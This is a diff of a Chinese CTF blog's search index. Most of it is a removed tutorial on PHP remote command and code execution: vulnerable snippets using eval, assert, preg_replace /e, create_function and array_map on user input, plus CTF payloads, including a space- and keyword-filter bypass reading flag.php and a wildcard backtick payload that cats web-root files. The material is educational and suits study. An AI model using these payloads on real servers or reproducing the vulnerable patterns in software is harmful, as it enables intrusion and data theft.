@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>正则表达式基础</title>
+    <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>杂项</category>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>正则表达式,python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>七字命令执行环境搭建</title>
     <url>/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<p>今天在总结RCE漏洞的时候看到了P神出的七字命令执行，感觉挺NB的，所以想自己搭个环境复现一下，遇到了一些小坑，所以记录一下，哎<del>~</del>还是太菜的缘故，想的太少，做的太少，环境搭起来都那么费劲，主要就是权限的问题。</p>
@@ -421,8 +434,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="七丶被偷走的文件"><a href="#七丶被偷走的文件" class="headerlink" title="七丶被偷走的文件"></a>七丶被偷走的文件</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701185150836.png" alt="image-20200701185150836"></p>
-<h3 id="八丶秘密文件"><a href="#八丶秘密文件" class="headerlink" title="八丶秘密文件"></a>八丶秘密文件</h3><h3 id="九丶sqltest"><a href="#九丶sqltest" class="headerlink" title="九丶sqltest"></a>九丶sqltest</h3><h3 id="十丶sqltest"><a href="#十丶sqltest" class="headerlink" title="十丶sqltest"></a>十丶sqltest</h3><h3 id="十一丶john-in-the-middle"><a href="#十一丶john-in-the-middle" class="headerlink" title="十一丶john-in-the-middle"></a>十一丶john-in-the-middle</h3><h3 id="十二丶-安洵杯-2019-Attack"><a href="#十二丶-安洵杯-2019-Attack" class="headerlink" title="十二丶[安洵杯 2019]Attack"></a>十二丶[安洵杯 2019]Attack</h3><h3 id="十三丶-SUCTF2018-followme"><a href="#十三丶-SUCTF2018-followme" class="headerlink" title="十三丶[SUCTF2018]followme"></a>十三丶[SUCTF2018]followme</h3><h3 id="十四丶voip"><a href="#十四丶voip" class="headerlink" title="十四丶voip"></a>十四丶voip</h3><h3 id="十五丶-BSidesSF2019-table-tennis"><a href="#十五丶-BSidesSF2019-table-tennis" class="headerlink" title="十五丶[BSidesSF2019]table-tennis"></a>十五丶[BSidesSF2019]table-tennis</h3><h3 id="十六丶greatescape"><a href="#十六丶greatescape" class="headerlink" title="十六丶greatescape"></a>十六丶greatescape</h3><h3 id="十七丶-CFI-CTF-2018-webLogon-capture"><a href="#十七丶-CFI-CTF-2018-webLogon-capture" class="headerlink" title="十七丶[CFI-CTF 2018]webLogon capture"></a>十七丶[CFI-CTF 2018]webLogon capture</h3><h3 id="十八丶-XMAN2018排位赛-AutoKey"><a href="#十八丶-XMAN2018排位赛-AutoKey" class="headerlink" title="十八丶[XMAN2018排位赛]AutoKey"></a>十八丶[XMAN2018排位赛]AutoKey</h3><h3 id="十九丶-SUCTF2019-protocol"><a href="#十九丶-SUCTF2019-protocol" class="headerlink" title="十九丶[SUCTF2019]protocol"></a>十九丶[SUCTF2019]protocol</h3><h3 id="二十丶-BSidesSF2019-thekey"><a href="#二十丶-BSidesSF2019-thekey" class="headerlink" title="二十丶[BSidesSF2019]thekey"></a>二十丶[BSidesSF2019]thekey</h3><h3 id="二十一丶-RCTF2019-printer"><a href="#二十一丶-RCTF2019-printer" class="headerlink" title="二十一丶[RCTF2019]printer"></a>二十一丶[RCTF2019]printer</h3><p>二十二丶</p>
-]]></content>
+<h3 id="八丶秘密文件"><a href="#八丶秘密文件" class="headerlink" title="八丶秘密文件"></a>八丶秘密文件</h3><h3 id="九丶sqltest"><a href="#九丶sqltest" class="headerlink" title="九丶sqltest"></a>九丶sqltest</h3><h3 id="十丶sqltest"><a href="#十丶sqltest" class="headerlink" title="十丶sqltest"></a>十丶sqltest</h3><h3 id="十一丶john-in-the-middle"><a href="#十一丶john-in-the-middle" class="headerlink" title="十一丶john-in-the-middle"></a>十一丶john-in-the-middle</h3><h3 id="十二丶-安洵杯-2019-Attack"><a href="#十二丶-安洵杯-2019-Attack" class="headerlink" title="十二丶[安洵杯 2019]Attack"></a>十二丶[安洵杯 2019]Attack</h3><h3 id="十三丶-SUCTF2018-followme"><a href="#十三丶-SUCTF2018-followme" class="headerlink" title="十三丶[SUCTF2018]followme"></a>十三丶[SUCTF2018]followme</h3><h3 id="十四丶voip"><a href="#十四丶voip" class="headerlink" title="十四丶voip"></a>十四丶voip</h3><h3 id="十五丶-BSidesSF2019-table-tennis"><a href="#十五丶-BSidesSF2019-table-tennis" class="headerlink" title="十五丶[BSidesSF2019]table-tennis"></a>十五丶[BSidesSF2019]table-tennis</h3><h3 id="十六丶greatescape"><a href="#十六丶greatescape" class="headerlink" title="十六丶greatescape"></a>十六丶greatescape</h3><h3 id="十七丶-CFI-CTF-2018-webLogon-capture"><a href="#十七丶-CFI-CTF-2018-webLogon-capture" class="headerlink" title="十七丶[CFI-CTF 2018]webLogon capture"></a>十七丶[CFI-CTF 2018]webLogon capture</h3><h3 id="十八丶-XMAN2018排位赛-AutoKey"><a href="#十八丶-XMAN2018排位赛-AutoKey" class="headerlink" title="十八丶[XMAN2018排位赛]AutoKey"></a>十八丶[XMAN2018排位赛]AutoKey</h3><h3 id="十九丶-SUCTF2019-protocol"><a href="#十九丶-SUCTF2019-protocol" class="headerlink" title="十九丶[SUCTF2019]protocol"></a>十九丶[SUCTF2019]protocol</h3><h3 id="二十丶-BSidesSF2019-thekey"><a href="#二十丶-BSidesSF2019-thekey" class="headerlink" title="二十丶[BSidesSF2019]thekey"></a>二十丶[BSidesSF2019]thekey</h3><h3 id="二十一丶-RCTF2019-printer"><a href="#二十一丶-RCTF2019-printer" class="headerlink" title="二十一丶[RCTF2019]printer"></a>二十一丶[RCTF2019]printer</h3><h3 id="二十二丶"><a href="#二十二丶" class="headerlink" title="二十二丶"></a>二十二丶</h3>]]></content>
       <categories>
         <category>CTF</category>
         <category>杂项</category>
@@ -2313,17 +2325,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2019强网杯&#39;&#39;随便注&#39;&#39;</title>
-    <url>/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF | 2018护网杯(WEB)easy_tornado(模板注入)</title>
     <url>/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</url>
     <content><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src= "/img/loading.gif" data-src="https://i.imgur.com/zsu1I4d.png" alt="1"></p>
@@ -2344,6 +2345,17 @@
       </categories>
       <tags>
         <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2019强网杯&#39;&#39;随便注&#39;&#39;</title>
+    <url>/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2913,113 +2925,6 @@
       </categories>
       <tags>
         <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE</title>
-    <url>/RCE/</url>
-    <content><![CDATA[<h1 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a>RCE漏洞原理</h1><p> <strong>英文全称：remote command/code execute(远程命令/代码执行漏洞)；</strong></p>
-<h3 id="RCE分为远程命令执行和远程代码执行"><a href="#RCE分为远程命令执行和远程代码执行" class="headerlink" title="RCE分为远程命令执行和远程代码执行"></a>RCE分为<font color = red>远程命令执行</font>和<font color = red>远程代码执行</font></h3><p>区别：   </p>
-<ul>
-<li>能够对一个php的站点，控制php代码，那么我们就把它划分为代码执行      </li>
-<li>如果能执行网站所在服务器中的命令，我们这就把它划分为命令执行，因为它执行的是系统命令</li>
-</ul>
-<h2 id="0x0-远程命令执行"><a href="#0x0-远程命令执行" class="headerlink" title="0x0 远程命令执行"></a>0x0 远程命令执行</h2><h4 id="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"><a href="#命令执行漏洞指的是可以执行系统或者应用指令的漏洞" class="headerlink" title="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"></a>命令执行漏洞指的是可以执行系统或者应用指令的漏洞</h4><p>如CMD命令或者bash命令的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有:<br><font color =red >system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open(),ob_start()，mail函数+LD_PRELOAD </font><br>执行系统命令共九个函数,另外反引号(`)也可以执行命令,不过实际上这种方式也是调用的shell_exec()函数。</p>
-<h2 id="讲解函数"><a href="#讲解函数" class="headerlink" title="讲解函数"></a>讲解函数</h2><p>php提供了system(),exec(),passthru()这几个函数来调用外部的命令.    </p>
-<p><font color = red>他们的区别 :</font>   </p>
-<ul>
-<li>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。  </li>
-<li>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</li>
-<li>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。   </li>
-</ul>
-<p><font color = red>相同点:</font>  </p>
-<ul>
-<li>都可以获得命令执行的状态码  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux下一条命令或一个进程执行完成会返回一个一个状态码。</span><br><span class="line"></span><br><span class="line">0   &#x3D;&#x3D;&#x3D;   成功执行</span><br><span class="line"></span><br><span class="line">非0 &#x3D;&#x3D;&#x3D;  执行过程中出现异常或非正常退出</span><br></pre></td></tr></table></figure>
-在PHP中调用外部命令，可以用如下三种方法来实现：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;system(&#39;whoami&#39;):   &quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">system(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;var_dump(exec(&#39;ipconfig&#39;)):   &quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">var_dump(exec(&#39;ipconfig&#39;));</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;exec(whoami,$b):&#39;;</span><br><span class="line">exec(&#39;whoami&#39;,$b);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">var_dump($b);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;exec(&#39;whoami&#39;)&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">exec(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;passthru(&#39;whoami&#39;):&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">passthru(&#39;whoami&#39;);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;shell_exec(&#39;ipconfig&#39;)&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
-<li><em>popen()函数*</em><br>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了的，下面我们看看 popen()的用法,它需要两个参数,一个是执行的命令,另<br>外一个是指针文件的连接模式，有r 和 w代表读和写。<br>测试代码如下：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows下</span><br><span class="line">&lt;?php</span><br><span class="line">popen(&#39;dir &gt;&gt;E:&#x2F;2.txt&#39;,&#39;w&#39;)</span><br><span class="line">&#x2F;&#x2F;把标准输出重定向到一个文件中(追加)</span><br><span class="line">?&gt;</span><br><span class="line">linux下：</span><br><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; popen(&quot;&#x2F;bin&#x2F;ls&quot;,&quot;r&quot;);</span><br><span class="line">&#x2F;&#x2F;some code to be executed</span><br><span class="line">pclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="CTF例题："><a href="#CTF例题：" class="headerlink" title="CTF例题："></a><font color = gree>CTF例题：</font></h2><ul>
-<li><p>DVWA靶场命令执行题<br><a href="http://127.0.0.1:8000/DVWA/vulnerabilities/exec/" target="_blank" rel="noopener">http://127.0.0.1:8000/DVWA/vulnerabilities/exec/</a></p>
-</li>
-<li><p>附一道GXY的题，现在buu上的pingpingping</p>
-</li>
-<li><pre><code>$ip=|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
-    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&apos;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  } else if(preg_match(&quot;/ /&quot;, $ip)){
-    die(&quot;fxck your space!&quot;);
-  } else if(preg_match(&quot;/bash/&quot;, $ip)){
-    die(&quot;fxck your bash!&quot;);
-  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
-    die(&quot;fxck your flag!&quot;);
-  }
-  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;
-&quot;;
-  print_r($a);}
-
-?&gt;
-//payload：127.0.0.1|ls;a=`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`;base64$IFS$9$a
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## &lt;font color &#x3D; gree&gt;远程代码执行&lt;&#x2F;font&gt;</span><br><span class="line">代码执行漏洞是指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行.说得好理解一点类似于SQL注人漏洞,可以把SQL语句注入到SQL服务执行，而PHP代码执行漏洞则是可以把代码注入</span><br><span class="line">到应用中，最终到Webserver去执行。   </span><br><span class="line"></span><br><span class="line">这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门存在，该漏洞主要由&lt;font color &#x3D; red&gt;eval()、assert()、preg_replace()、call_user_func()call_user_func_array()、array_map()&lt;&#x2F;font&gt;等函数的参数过滤不严格导致     </span><br><span class="line"></span><br><span class="line">另外还有PHP的动态函数（$a($b))也是目前出现比较多的。</span><br><span class="line"></span><br><span class="line">## &lt;font color &#x3D; gree&gt;讲解函数&lt;&#x2F;font&gt;</span><br><span class="line">### &lt;font color &#x3D; red&gt;eval()函数&lt;&#x2F;font&gt;   </span><br><span class="line">eval() 函数把字符串按照 PHP 代码来计算。   </span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾。    </span><br><span class="line">如果代码中存在解析错误，则 eval() 函数返回 false。</span><br></pre></td></tr></table></figure>
-&lt;?php
-$a = &apos;aaa&apos;;
-$b = &apos;bbb&apos;;
-eval(&apos;$a=$b;&apos;);
-var_dump($a);
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~~</span><br><span class="line">&lt;?php</span><br><span class="line">eval(&#39;echo 1111;&#39;);</span><br></pre></td></tr></table></figure>
-代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来闭合离开、重新进入 PHP 模式。   
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;);</span><br><span class="line">eval(&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Hi!&quot;;&#39;);</span><br><span class="line">?&gt;闭合php文件开头的&lt;?php，&lt;?&#x3D;可以输出。</span><br><span class="line">另外这里&lt;? ?&gt;是短标签，&lt;?php ?&gt;是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：&lt;? ?&gt;同时，</span><br><span class="line">只有开启这个才可以使用 &lt;?&#x3D; 以代替 &lt;? echo。不过在php7中这个标签被移除了。</span><br></pre></td></tr></table></figure>
-### &lt;font color = red&gt;assert()函数&lt;/font&gt;  
-bool assert ( mixed $assertion [, string $description ] )    
-在PHP语言中是用来判断一个表达式是否成立，返回true or false。    
-如果assertion 是字符串，它将会被assert（）当做PHP代码来执行。    
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s &#x3D; 123;</span><br><span class="line">var_dump(assert(&quot;is_int($s)&quot;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">function fo()&#123;</span><br><span class="line">  $fp &#x3D; fopen(&quot;E:&#x2F;&#x2F;2.txt&quot;,&#39;w&#39;);</span><br><span class="line">  fwrite($fp,&quot;123&quot;);</span><br><span class="line">  fclose($fp);</span><br><span class="line">  return true;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(assert(&quot;fo()&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-函数原理：https://www.jianshu.com/p/6f7cc896ba2a
-### &lt;font color = red&gt;preg_replace()函数&lt;/font&gt;
-preg_replace 执行一个正则表达式的搜索和替换。
-</code></pre></li>
-</ul>
-<p>执行代码需要使用<code>/e</code>修饰符。如果不使用<code>/e</code>修饰符，代码则不会执行。这个函数比较早，5.5中它已经被弃用了，但是你一样可以去使用它，但是在7.0之后，你就没办法去调用。    </p>
-<p>它的参数和返回如下：   </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
-
-<p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。<br>参数说明：<br>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。    </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@preg_replace(&quot;&#x2F;\[(.*)\]&#x2F;e&quot;,&#39;\\1&#39;,$_GET[&#39;str&#39;]);</span><br><span class="line">&#x2F;&#x2F;preg_replace函数需要使用&#x2F;e修饰符执行正则。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>正则的意思是GET传递的str变量里搜索中括号口中间的内容作为第一组结果， preg_replace（）函数<br>第二个参数为 ‘\\1’代表这里用第一组结果填充，这里是可以直接执行代码的，所以当我们请求 /1.php?str=[phpinfo()]时，则执行代码phpinfo()</p>
-<p>这个函数比较复杂，感兴趣的可以去这个博客看看   </p>
-<p><code>https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E6%A1%88%E4%BE%8B</code></p>
-<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a><font color = red>create_function</font></h3><p>说明</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string create_function ( string $args , string $code )</span><br></pre></td></tr></table></figure>
-
-<p>该函数用来创建匿名函数。<br>这个函数的实现大概是这样的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$name'</span>,<span class="string">'echo $name;'</span>);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b(yang);</span><br><span class="line"></span><br><span class="line">niming(<span class="string">'yang'</span>);</span><br></pre></td></tr></table></figure>
-
-<p>第二个参数是执行代码的地方，将payload放在第二个参数的位置，然后调用该函数就可以执行payload了。<br>执行代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'phpinfo();'</span>;</span><br><span class="line">$b = create_function(<span class="string">" "</span>,$a);</span><br><span class="line">$b();</span><br></pre></td></tr></table></figure>
-
-<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a><font color = red>array_map()</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</span><br><span class="line">array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</span><br></pre></td></tr></table></figure>
-
-<p>漏洞演示</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//?a=assert&amp;b=phpinfo();</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$array[<span class="number">0</span>] = $b;</span><br><span class="line">$c = array_map($a,$array);</span><br></pre></td></tr></table></figure>
-
-<h3 id="eval-函数例题："><a href="#eval-函数例题：" class="headerlink" title="eval()函数例题："></a>eval()函数例题：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>/bin/cat 执行命令</strong>    </p>
-<p><strong>``反单引号执行命令</strong>   </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;*&quot;</span><br></pre></td></tr></table></figure>
-<p><strong>无字母数字preg_match绕过</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;v01cano&#x2F;p&#x2F;11736722.html</span><br></pre></td></tr></table></figure>
-
-<h3 id="create-function例题"><a href="#create-function例题" class="headerlink" title="create_function例题"></a>create_function例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">$code = <span class="string">'echo $name. '</span>.<span class="string">'的编号是'</span>.$id.<span class="string">'; '</span>;</span><br><span class="line"></span><br><span class="line">$b = create_function(<span class="string">'$name'</span>,$code);</span><br><span class="line"><span class="comment">//实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"编号"</span>.$id;</span><br><span class="line">&#125;</span><br><span class="line">$b(<span class="string">'sd'</span>);</span><br><span class="line"><span class="comment">//payload：?id=2;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>WEB安全漏洞</category>
-        <category>RCE漏洞</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
